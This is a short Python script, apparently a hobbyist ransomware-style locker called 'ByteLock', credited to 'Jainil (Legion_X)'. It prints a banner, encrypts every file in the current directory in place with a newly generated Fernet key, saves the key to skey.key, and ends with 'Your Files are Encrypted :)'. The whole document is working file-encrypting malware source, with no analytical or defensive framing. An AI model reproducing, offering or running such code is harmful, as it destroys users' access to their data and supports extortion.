
banner = """
  ______       _       _                _
  | ___ \     | |     | |              | |
  | |_/ /_   _| |_ ___| |     ___   ___| | __
  | ___ \ | | | __/ _ \ |    / _ \ / __| |/ /
  | |_/ / |_| | ||  __/ |___| (_) | (__|   <
  \____/ \__, |\__\___\_____/\___/ \___|_|\_\
          __/ |
         |___/

			 By Jainil (Legion_X)
"""



print(banner)


import os
import time
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == 'bytelock.py' or file == 'skey.key' or file == 'decrypt.py':
		continue
	
	if os.path.isfile(file):
		files.append(file)



key = Fernet.generate_key()


with open("skey.key","wb") as skey:
	skey.write(key)



for file in files:
	with open(file,"rb") as thefile:
		data = thefile.read()
	encrypted_data = Fernet(key).encrypt(data)
	with open(file,"wb") as thefile:
		thefile.write(encrypted_data)




def fun():
	print('Encrypting Your Files...')



time.sleep(1)
fun()
time.sleep(5)
print('Your Files are Encrypted :)')
